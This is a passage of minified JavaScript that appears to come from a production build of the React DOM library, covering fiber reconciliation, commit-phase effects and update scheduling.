re(t),null;if(r=(t.flags&128)!==0,s=l.rendering,s===null)if(r)yn(l,!1);else{if(Q!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(s=Kr(e),s!==null){for(t.flags|=128,yn(l,!1),r=s.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;n!==null;)l=n,e=r,l.flags&=14680066,s=l.alternate,s===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=s.childLanes,l.lanes=s.lanes,l.child=s.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=s.memoizedProps,l.memoizedState=s.memoizedState,l.updateQueue=s.updateQueue,l.type=s.type,e=s.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return A(z,z.current&1|2),t.child}e=e.sibling}l.tail!==null&&J()>ln&&(t.flags|=128,r=!0,yn(l,!1),t.lanes=4194304)}else{if(!r)if(e=Kr(s),e!==null){if(t.flags|=128,r=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),yn(l,!0),l.tail===null&&l.tailMode==="hidden"&&!s.alternate&&!F)return re(t),null}else 2*J()-l.renderingStartTime>ln&&n!==1073741824&&(t.flags|=128,r=!0,yn(l,!1),t.lanes=4194304);l.isBackwards?(s.sibling=t.child,t.child=s):(n=l.last,n!==null?n.sibling=s:t.child=s,l.last=s)}return l.tail!==null?(t=l.tail,l.rendering=t,l.tail=t.sibling,l.renderingStartTime=J(),t.sibling=null,n=z.current,A(z,r?n&1|2:n&1),t):(re(t),null);case 22:case 23:return bs(),r=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(t.flags|=8192),r&&t.mode&1?he&1073741824&&(re(t),t.subtreeFlags&6&&(t.flags|=8192)):re(t),null;case 24:return null;case 25:return null}throw Error(S(156,t.tag))}function vf(e,t){switch(cs(t),t.tag){case 1:return pe(t.type)&&Ur(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return rn(),_(fe),_(le),Ss(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return ys(t),null;case 13:if(_(z),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(S(340));tn()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return _(z),null;case 4:return rn(),null;case 10:return ms(t.type._context),null;case 22:case 23:return bs(),null;case 24:return null;default:return null}}var vr=!1,oe=!1,yf=typeof WeakSet=="function"?WeakSet:Set,T=null;function Jt(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){W(e,t,r)}else n.current=null}function Ol(e,t,n){try{n()}catch(r){W(e,t,r)}}var Ii=!1;function Sf(e,t){if(vl=_r,e=$a(),as(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var o=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{n.nodeType,l.nodeType}catch{n=null;break e}var s=0,i=-1,a=-1,c=0,g=0,f=e,h=null;t:for(;;){for(var k;f!==n||o!==0&&f.nodeType!==3||(i=s+o),f!==l||r!==0&&f.nodeType!==3||(a=s+r),f.nodeType===3&&(s+=f.nodeValue.length),(k=f.firstChild)!==null;)h=f,f=k;for(;;){if(f===e)break t;if(h===n&&++c===o&&(i=s),h===l&&++g===r&&(a=s),(k=f.nextSibling)!==null)break;f=h,h=f.parentNode}f=k}n=i===-1||a===-1?null:{start:i,end:a}}else n=null}n=n||{start:0,end:0}}else n=null;for(yl={focusedElem:e,selectionRange:n},_r=!1,T=t;T!==null;)if(t=T,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,T=e;else for(;T!==null;){t=T;try{var w=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var C=w.memoizedProps,O=w.memoizedState,d=t.stateNode,u=d.getSnapshotBeforeUpdate(t.elementType===t.type?C:Me(t.type,C),O);d.__reactInternalSnapshotBeforeUpdate=u}break;case 3:var p=t.stateNode.containerInfo;p.nodeType===1?p.textContent="":p.nodeType===9&&p.documentElement&&p.removeChild(p.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(S(163))}}catch(y){W(t,t.return,y)}if(e=t.sibling,e!==null){e.return=t.return,T=e;break}T=t.return}return w=Ii,Ii=!1,w}function bn(e,t,n){var r=t.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var o=r=r.next;do{if((o.tag&e)===e){var l=o.destroy;o.destroy=void 0,l!==void 0&&Ol(t,n,l)}o=o.next}while(o!==r)}}function po(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function Al(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function Bu(e){var t=e.alternate;t!==null&&(e.alternate=null,Bu(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[_e],delete t[Bn],delete t[kl],delete t[ef],delete t[tf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Vu(e){return e.tag===5||e.tag===3||e.tag===4}function _i(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Vu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Il(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=Hr));else if(r!==4&&(e=e.child,e!==null))for(Il(e,t,n),e=e.sibling;e!==null;)Il(e,t,n),e=e.sibling}function _l(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(_l(e,t,n),e=e.sibling;e!==null;)_l(e,t,n),e=e.sibling}var Z=null,be=!1;function Xe(e,t,n){for(n=n.child;n!==null;)Ju(e,t,n),n=n.sibling}function Ju(e,t,n){if(Fe&&typeof Fe.onCommitFiberUnmount=="function")try{Fe.onCommitFiberUnmount(oo,n)}catch{}switch(n.tag){case 5:oe||Jt(n,t);case 6:var r=Z,o=be;Z=null,Xe(e,t,n),Z=r,be=o,Z!==null&&(be?(e=Z,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):Z.removeChild(n.stateNode));break;case 18:Z!==null&&(be?(e=Z,n=n.stateNode,e.nodeType===8?zo(e.parentNode,n):e.nodeType===1&&zo(e,n),Fn(e)):zo(Z,n.stateNode));break;case 4:r=Z,o=be,Z=n.stateNode.containerInfo,be=!0,Xe(e,t,n),Z=r,be=o;break;case 0:case 11:case 14:case 15:if(!oe&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){o=r=r.next;do{var l=o,s=l.destroy;l=l.tag,s!==void 0&&(l&2||l&4)&&Ol(n,t,s),o=o.next}while(o!==r)}Xe(e,t,n);break;case 1:if(!oe&&(Jt(n,t),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(i){W(n,t,i)}Xe(e,t,n);break;case 21:Xe(e,t,n);break;case 22:n.mode&1?(oe=(r=oe)||n.memoizedState!==null,Xe(e,t,n),oe=r):Xe(e,t,n);break;default:Xe(e,t,n)}}function Fi(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new yf),t.forEach(function(r){var o=Rf.bind(null,e,r);n.has(r)||(n.add(r),r.then(o,o))})}}function Re(e,t){var n=t.deletions;if(n!==null)for(var r=0;r<n.length;r++){var o=n[r];try{var l=e,s=t,i=s;e:for(;i!==null;){switch(i.tag){case 5:Z=i.stateNode,be=!1;break e;case 3:Z=i.stateNode.containerInfo,be=!0;break e;case 4:Z=i.stateNode.containerInfo,be=!0;break e}i=i.return}if(Z===null)throw Error(S(160));Ju(l,s,o),Z=null,be=!1;var a=o.alternate;a!==null&&(a.return=null),o.return=null}catch(c){W(o,t,c)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)Gu(t,e),t=t.sibling}function Gu(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Re(t,e),Ae(e),r&4){try{bn(3,e,e.return),po(3,e)}catch(C){W(e,e.return,C)}try{bn(5,e,e.return)}catch(C){W(e,e.return,C)}}break;case 1:Re(t,e),Ae(e),r&512&&n!==null&&Jt(n,n.return);break;case 5:if(Re(t,e),Ae(e),r&512&&n!==null&&Jt(n,n.return),e.flags&32){var o=e.stateNode;try{On(o,"")}catch(C){W(e,e.return,C)}}if(r&4&&(o=e.stateNode,o!=null)){var l=e.memoizedProps,s=n!==null?n.memoizedProps:l,i=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{i==="input"&&l.type==="radio"&&l.name!=null&&ma(o,l),il(i,s);var c=il(i,l);for(s=0;s<a.length;s+=2){var g=a[s],f=a[s+1];g==="style"?Sa(o,f):g==="dangerouslySetInnerHTML"?va(o,f):g==="children"?On(o,f):Ql(o,g,f,c)}switch(i){case"input":nl(o,l);break;case"textarea":ha(o,l);break;case"select":var h=o._wrapperState.wasMultiple;o._wrapperState.wasMultiple=!!l.multiple;var k=l.value;k!=null?$t(o,!!l.multiple,k,!1):h!==!!l.multiple&&(l.defaultValue!=null?$t(o,!!l.multiple,l.defaultValue,!0):$t(o,!!l.multiple,l.multiple?[]:"",!1))}o[Bn]=l}catch(C){W(e,e.return,C)}}break;case 6:if(Re(t,e),Ae(e),r&4){if(e.stateNode===null)throw Error(S(162));o=e.stateNode,l=e.memoizedProps;try{o.nodeValue=l}catch(C){W(e,e.return,C)}}break;case 3:if(Re(t,e),Ae(e),r&4&&n!==null&&n.memoizedState.isDehydrated)try{Fn(t.containerInfo)}catch(C){W(e,e.return,C)}break;case 4:Re(t,e),Ae(e);break;case 13:Re(t,e),Ae(e),o=e.child,o.flags&8192&&(l=o.memoizedState!==null,o.stateNode.isHidden=l,!l||o.alternate!==null&&o.alternate.memoizedState!==null||(Rs=J())),r&4&&Fi(e);break;case 22:if(g=n!==null&&n.memoizedState!==null,e.mode&1?(oe=(c=oe)||g,Re(t,e),oe=c):Re(t,e),Ae(e),r&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!g&&e.mode&1)for(T=e,g=e.child;g!==null;){for(f=T=g;T!==null;){switch(h=T,k=h.child,h.tag){case 0:case 11:case 14:case 15:bn(4,h,h.return);break;case 1:Jt(h,h.return);var w=h.stateNode;if(typeof w.componentWillUnmount=="function"){r=h,n=h.return;try{t=r,w.props=t.memoizedProps,w.state=t.memoizedState,w.componentWillUnmount()}catch(C){W(r,n,C)}}break;case 5:Jt(h,h.return);break;case 22:if(h.memoizedState!==null){Hi(f);continue}}k!==null?(k.return=h,T=k):Hi(f)}g=g.sibling}e:for(g=null,f=e;;){if(f.tag===5){if(g===null){g=f;try{o=f.stateNode,c?(l=o.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(i=f.stateNode,a=f.memoizedProps.style,s=a!=null&&a.hasOwnProperty("display")?a.display:null,i.style.display=ya("display",s))}catch(C){W(e,e.return,C)}}}else if(f.tag===6){if(g===null)try{f.stateNode.nodeValue=c?"":f.memoizedProps}catch(C){W(e,e.return,C)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===e)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===e)break e;for(;f.sibling===null;){if(f.return===null||f.return===e)break e;g===f&&(g=null),f=f.return}g===f&&(g=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:Re(t,e),Ae(e),r&4&&Fi(e);break;case 21:break;default:Re(t,e),Ae(e)}}function Ae(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(Vu(n)){var r=n;break e}n=n.return}throw Error(S(160))}switch(r.tag){case 5:var o=r.stateNode;r.flags&32&&(On(o,""),r.flags&=-33);var l=_i(e);_l(e,l,o);break;case 3:case 4:var s=r.stateNode.containerInfo,i=_i(e);Il(e,i,s);break;default:throw Error(S(161))}}catch(a){W(e,e.return,a)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function wf(e,t,n){T=e,$u(e)}function $u(e,t,n){for(var r=(e.mode&1)!==0;T!==null;){var o=T,l=o.child;if(o.tag===22&&r){var s=o.memoizedState!==null||vr;if(!s){var i=o.alternate,a=i!==null&&i.memoizedState!==null||oe;i=vr;var c=oe;if(vr=s,(oe=a)&&!c)for(T=o;T!==null;)s=T,a=s.child,s.tag===22&&s.memoizedState!==null?Ui(o):a!==null?(a.return=s,T=a):Ui(o);for(;l!==null;)T=l,$u(l),l=l.sibling;T=o,vr=i,oe=c}zi(e)}else o.subtreeFlags&8772&&l!==null?(l.return=o,T=l):zi(e)}}function zi(e){for(;T!==null;){var t=T;if(t.flags&8772){var n=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:oe||po(5,t);break;case 1:var r=t.stateNode;if(t.flags&4&&!oe)if(n===null)r.componentDidMount();else{var o=t.elementType===t.type?n.memoizedProps:Me(t.type,n.memoizedProps);r.componentDidUpdate(o,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=t.updateQueue;l!==null&&xi(t,l,r);break;case 3:var s=t.updateQueue;if(s!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}xi(t,s,n)}break;case 5:var i=t.stateNode;if(n===null&&t.flags&4){n=i;var a=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&n.focus();break;case"img":a.src&&(n.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var c=t.alternate;if(c!==null){var g=c.memoizedState;if(g!==null){var f=g.dehydrated;f!==null&&Fn(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(S(163))}oe||t.flags&512&&Al(t)}catch(h){W(t,t.return,h)}}if(t===e){T=null;break}if(n=t.sibling,n!==null){n.return=t.return,T=n;break}T=t.return}}function Hi(e){for(;T!==null;){var t=T;if(t===e){T=null;break}var n=t.sibling;if(n!==null){n.return=t.return,T=n;break}T=t.return}}function Ui(e){for(;T!==null;){var t=T;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{po(4,t)}catch(a){W(t,n,a)}break;case 1:var r=t.stateNode;if(typeof r.componentDidMount=="function"){var o=t.return;try{r.componentDidMount()}catch(a){W(t,o,a)}}var l=t.return;try{Al(t)}catch(a){W(t,l,a)}break;case 5:var s=t.return;try{Al(t)}catch(a){W(t,s,a)}}}catch(a){W(t,t.return,a)}if(t===e){T=null;break}var i=t.sibling;if(i!==null){i.return=t.return,T=i;break}T=t.return}}var kf=Math.ceil,Yr=Qe.ReactCurrentDispatcher,Ps=Qe.ReactCurrentOwner,Te=Qe.ReactCurrentBatchConfig,L=0,q=null,G=null,ee=0,he=0,Gt=ht(0),Q=0,Qn=null,Mt=0,mo=0,js=0,Dn=null,ce=null,Rs=0,ln=1/0,He=null,qr=!1,Fl=null,ut=null,yr=!1,rt=null,Zr=0,Ln=0,zl=null,Mr=-1,br=0;function ie(){return L&6?J():Mr!==-1?Mr:Mr=J()}function ct(e){return e.mode&1?L&2&&ee!==0?ee&-ee:rf.transition!==null?(br===0&&(br=Da()),br):(e=N,e!==0||(e=window.event,e=e===void 0?16:Fa(e.type)),e):1}function Ne(e,t,n,r){if(50<Ln)throw Ln=0,zl=null,Error(S(185));Yn(e,n,r),(!(L&2)||e!==q)&&(e===q&&(!(L&2)&&(mo|=n),Q===4&&tt(e,ee)),me(e,r),n===1&&L===0&&!(t.mode&1)&&(ln=J()+500,uo&&gt()))}function me(e,t){var n=e.callbackNode;rd(e,t);var r=Ir(e,e===q?ee:0);if(r===0)n!==null&&Xs(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(n!=null&&Xs(n),t===1)e.tag===0?nf(Wi.bind(null,e)):ru(Wi.bind(null,e)),qd(function(){!(L&6)&&gt()}),n=null;else{switch(La(r)){case 1:n=es;break;case 4:n=Ma;break;case 16:n=Ar;break;case 536870912:n=ba;break;default:n=Ar}n=tc(n,Ku.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function Ku(e,t){if(Mr=-1,br=0,L&6)throw Error(S(327));var n=e.callbackNode;if(qt()&&e.callbackNode!==n)return null;var r=Ir(e,e===q?ee:0);if(r===0)return null;if(r&30||r&e.expiredLanes||t)t=eo(e,r);else{t=r;var o=L;L|=2;var l=Xu();(q!==e||ee!==t)&&(He=null,ln=J()+500,Tt(e,t));do try{Tf();break}catch(i){Qu(e,i)}while(!0);ps(),Yr.current=l,L=o,G!==null?t=0:(q=null,ee=0,t=Q)}if(t!==0){if(t===2&&(o=fl(e),o!==0&&(r=o,t=Hl(e,o))),t===1)throw n=Qn,Tt(e,0),tt(e,r),me(e,J()),n;if(t===6)tt(e,r);else{if(o=e.current.alternate,!(r&30)&&!Cf(o)&&(t=eo(e,r),t===2&&(l=fl(e),l!==0&&(r=l,t=Hl(e,l))),t===1))throw n=Qn,Tt(e,0),tt(e,r),me(e,J()),n;switch(e.finishedWork=o,e.finishedLanes=r,t){case 0:case 1:throw Error(S(345));case 2:wt(e,ce,He);break;case 3:if(tt(e,r),(r&130023424)===r&&(t=Rs+500-J(),10<t)){if(Ir(e,0)!==0)break;if(o=e.suspendedLanes,(o&r)!==r){ie(),e.pingedLanes|=e.suspendedLanes&o;break}e.timeoutHandle=wl(wt.bind(null,e,ce,He),t);break}wt(e,ce,He);break;case 4:if(tt(e,r),(r&4194240)===r)break;for(t=e.eventTimes,o=-1;0<r;){var s=31-Le(r);l=1<<s,s=t[s],s>o&&(o=s),r&=~l}if(r=o,r=J()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*kf(r/1960))-r,10<r){e.timeoutHandle=wl(wt.bind(null,e,ce,He),r);break}wt(e,ce,He);break;case 5:wt(e,ce,He);break;default:throw Error(S(329))}}}return me(e,J()),e.callbackNode===n?Ku.bind(null,e):null}function Hl(e,t){var n=Dn;return e.current.memoizedState.isDehydrated&&(Tt(e,t).flags|=256),e=eo(e,t),e!==2&&(t=ce,ce=n,t!==null&&Ul(t)),e}function Ul(e){ce===null?ce=e:ce.push.apply(ce,e)}function Cf(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var o=n[r],l=o.getSnapshot;o=o.value;try{if(!Oe(l(),o))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function tt(e,t){for(t&=~js,t&=~mo,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-Le(t),r=1<<n;e[n]=-1,t&=~r}}function Wi(e){if(L&6)throw Error(S(327));qt();var t=Ir(e,0);if(!(t&1))return me(e,J()),null;var n=eo(e,t);if(e.tag!==0&&n===2){var r=fl(e);r!==0&&(t=r,n=Hl(e,r))}if(n===1)throw n=Qn,Tt(e,0),tt(e,t),me(e,J()),n;if(n===6)throw Error(S(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,wt(e,ce,He),me(e,J()),null}function Ms(e,t){var n=L;L|=1;try{return e(t)}finally{L=n,L===0&&(ln=J()+500,uo&&gt())}}function bt(e){rt!==null&&rt.tag===0&&!(L&6)&&qt();var t=L;L|=1;var n=Te.transition,r=N;try{if(Te.transition=null,N=1,e)return e()}finally{N=r,Te.transition=n,L=t,!(L&6)&&gt()}}function bs(){he=Gt.current,_(Gt)}function Tt(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,Yd(n)),G!==null)for(n=G.return;n!==null;){var r=n;switch(cs(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Ur();break;case 3:rn(),_(fe),_(le),Ss();break;case 5:ys(r);break;case 4:rn();break;case 13:_(z);break;case 19:_(z);break;case 10:ms(r.type._context);break;case 22:case 23:bs()}n=n.return}if(q=e,G=e=dt(e.current,null),ee=he=t,Q=0,Qn=null,js=mo=Mt=0,ce=Dn=null,Ct!==null){for(t=0;t<Ct.length;t++)if(n=Ct[t],r=n.interleaved,r!==null){n.interleaved=null;var o=r.next,l=n.pending;if(l!==null){var s=l.next;l.next=o,r.next=s}n.pending=r}Ct=null}return e}function Qu(e,t){do{var n=G;try{if(ps(),Pr.current=Xr,Qr){for(var r=H.memoizedState;r!==null;){var o=r.queue;o!==null&&(o.pending=null),r=r.next}Qr=!1}if(Rt=0,Y=K=H=null,Mn=!1,Gn=0,Ps.current=null,n===null||n.return===null){Q=1,Qn=t,G=null;break}e:{var l=e,s=n.return,i=n,a=t;if(t=ee,i.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var c=a,g=i,f=g.tag;if(!(g.mode&1)&&(f===0||f===11||f===15)){var h=g.alternate;h?(g.updateQueue=h.updateQueue,g.memoizedState=h.memoizedState,g.lanes=h.lanes):(g.updateQueue=null,g.memoizedState=null)}var k=Mi(s);if(k!==null){k.flags&=-257,bi(k,s,i,l,t),k.mode&1&&Ri(l,c,t),t=k,a=c;var w=t.updateQueue;if(w===null){var C=new Set;C.add(a),t.updateQueue=C}else w.add(a);break e}else{if(!(t&1)){Ri(l,c,t),Ds();break e}a=Error(S(426))}}else if(F&&i.mode&1){var O=Mi(s);if(O!==null){!(O.flags&65536)&&(O.flags|=256),bi(O,s,i,l,t),ds(on(a,i));break e}}l=a=on(a,i),Q!==4&&(Q=2),Dn===null?Dn=[l]:Dn.push(l),l=s;do{switch(l.tag){case 3:l.flags|=65536,t&=-t,l.lanes|=t;var d=Lu(l,a,t);Ci(l,d);break e;case 1:i=a;var u=l.type,p=l.stateNode;if(!(l.flags&128)&&(typeof u.getDerivedStateFromError=="function"||p!==null&&typeof p.componentDidCatch=="function"&&(ut===null||!ut.has(p)))){l.flags|=65536,t&=-t,l.lanes|=t;var y=Nu(l,i,t);Ci(l,y);break e}}l=l.return}while(l!==null)}qu(n)}catch(x){t=x,G===n&&n!==null&&(G=n=n.return);continue}break}while(!0)}function Xu(){var e=Yr.current;return Yr.current=Xr,e===null?Xr:e}function Ds(){(Q===0||Q===3||Q===2)&&(Q=4),q===null||!(Mt&268435455)&&!(mo&268435455)||tt(q,ee)}function eo(e,t){var n=L;L|=2;var r=Xu();(q!==e||ee!==t)&&(He=null,Tt(e,t));do try{xf();break}catch(o){Qu(e,o)}while(!0);if(ps(),L=n,Yr.current=r,G!==null)throw Error(S(261));return q=null,ee=0,Q}function xf(){for(;G!==null;)Yu(G)}function Tf(){for(;G!==null&&!Kc();)Yu(G)}function Yu(e){var t=ec(e.alternate,e,he);e.memoizedProps=e.pendingProps,t===null?qu(e):G=t,Ps.current=null}function qu(e){var t=e;do{var n=t.alternate;if(e=t.return,t.flags&32768){if(n=vf(n,t),n!==null){n.flags&=32767,G=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{Q=6,G=null;return}}else if(n=gf(n,t,he),n!==null){G=n;return}if(t=t.sibling,t!==null){G=t;return}G=t=e}while(t!==null);Q===0&&(Q=5)}function wt(e,t,n){var r=N,o=Te.transition;try{Te.transition=null,N=1,Ef(e,t,n,r)}finally{Te.transition=o,N=r}return null}function Ef(e,t,n,r){do qt();while(rt!==null);if(L&6)throw Error(S(327));n=e.finishedWork;var o=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(S(177));e.callbackNode=null,e.callbackPriority=0;var l=n.lanes|n.childLanes;if(od(e,l),e===q&&(G=q=null,ee=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||yr||(yr=!0,tc(Ar,function(){return qt(),null})),l=(n.flags&15990)!==0,n.subtreeFlags&15990||l){l=Te.transition,Te.transition=null;var s=N;N=1;var i=L;L|=4,Ps.current=null,Sf(e,n),Gu(n,e),Vd(yl),_r=!!vl,yl=vl=null,e.current=n,wf(n),Qc(),L=i,N=s,Te.transition=l}else e.current=n;if(yr&&(yr=!1,rt=e,Zr=o),l=e.pendingLanes,l===0&&(ut=null),qc(n.stateNode),me(e,J()),t!==null)for(r=e.onRecoverableError,n=0;n<t.length;n++)o=t[n],r(o.value,{componentStack:o.stack,digest:o.digest});if(qr)throw qr=!1,e=Fl,Fl=null,e;return Zr&1&&e.tag!==0&&qt(),l=e.pendingLanes,l&1?e===zl?Ln++:(Ln=0,zl=e):Ln=0,gt(),null}function qt(){if(rt!==null){var e=La(Zr),t=Te.transition,n=N;try{if(Te.transition=null,N=16>e?16:e,rt===null)var r=!1;else{if(e=rt,rt=null,Zr=0,L&6)throw Error(S(331));var o=L;for(L|=4,T=e.current;T!==null;){var l=T,s=l.child;if(T.flags&16){var i=l.deletions;if(i!==null){for(var a=0;a<i.length;a++){var c=i[a];for(T=c;T!==null;){var g=T;switch(g.tag){case 0:case 11:case 15:bn(8,g,l)}var f=g.child;if(f!==null)f.return=g,T=f;else for(;T!==null;){g=T;var h=g.sibling,k=g.return;if(Bu(g),g===c){T=null;break}if(h!==null){h.return=k,T=h;break}T=k}}}var w=l.alternate;if(w!==null){var C=w.child;if(C!==null){w.child=null;do{var O=C.sibling;C.sibling=null,C=O}while(C!==null)}}T=l}}if(l.subtreeFlags&2064&&s!==null)s.return=l,T=s;else e:for(;T!==null;){if(l=T,l.flags&2048)switch(l.tag){case 0:case 11:case 15:bn(9,l,l.return)}var d=l.sibling;if(d!==null){d.return=l.return,T=d;break e}T=l.return}}var u=e.current;for(T=u;T!==null;){s=T;var p=s.child;if(s.subtreeFlags&2064&&p!==null)p.return=s,T=p;else e:for(s=u;T!==null;){if(i=T,i.flags&2048)try{switch(i.tag){case 0:case 11:case 15:po(9,i)}}catch(x){W(i,i.return,x)}if(i===s){T=null;break e}var y=i.sibling;if(y!==null){y.return=i.return,T=y;break e}T=i.return}}if(L=o,gt(),Fe&&typeof Fe.onPostCommitFiberRoot=="function")try{Fe.onPostCommitFiberRoot(oo,e)}catch{}r=!0}return r}finally{N=n,Te.transition=t}}return!1}function Bi(e,t,n){t=on(n,t),t=Lu(e,t,1),e=at(e,t,1),t=ie(),e!==null&&(Yn(e,1,t),me(e,t))}function W(e,t,n){if(e.tag===3)Bi(e,e,n);else for(;t!==null;){if(t.tag===3){Bi(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(ut===null||!ut.has(r))){e=on(n,e),e=Nu(t,e,1),t=at(t,e,1),e=ie(),t!==null&&(Yn(t,1,e),me(t,e));break}}t=t.return}}function Pf(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),t=ie(),e.pingedLanes|=e.suspendedLanes&n,q===e&&(ee&n)===n&&(Q===4||Q===3&&(ee&130023424)===ee&&500>J()-Rs?Tt(e,0):js|=n),me(e,t)}function Zu(e,t){t===0&&(e.mode&1?(t=ar,ar<<=1,!(ar&130023424)&&(ar=4194304)):t=1);var n=ie();e=$e(e,t),e!==null&&(Yn(e,t,n),me(e,n))}function jf(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),Zu(e,n)}function Rf(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,o=e.memoizedState;o!==null&&(n=o.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(S(314))}r!==null&&r.delete(t),Zu(e,n)}var ec;ec=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||fe.current)de=!0;else{if(!(e.lanes&n)&&!(t.flags&128))return de=!1,hf(e,t,n);de=!!(e.flags&131072)}else de=!1,F&&t.flags&1048576&&ou(t,Vr,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;Rr(e,t),e=t.pendingProps;var o=en(t,le.current);Yt(t,n),o=ks(null,t,r,e,o,n);var l=Cs();return t.flags|=1,typeof o=="object"&&o!==null&&typeof o.render=="function"&&o.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,pe(r)?(l=!0,Wr(t)):l=!1,t.memoizedState=o.state!==null&&o.state!==void 0?o.state:null,gs(t),o.updater=fo,t.stateNode=o,o._reactInternals=t,jl(t,r,e,n),t=bl(null,t,r,!0,l,n)):(t.tag=0,F&&l&&us(t),se(null,t,o,n),t=t.child),t;case 16:r=t.elementType;e:{switch(Rr(e,t),e=t.pendingProps,o=r._init,r=o(r._payload),t.type=r,o=t.tag=bf(r),e=Me(r,e),o){case 0:t=Ml(null,t,r,e,n);break e;case 1:t=Ni(null,t,r,e,n);break e;case 11:t=Di(null,t,r,e,n);break e;case 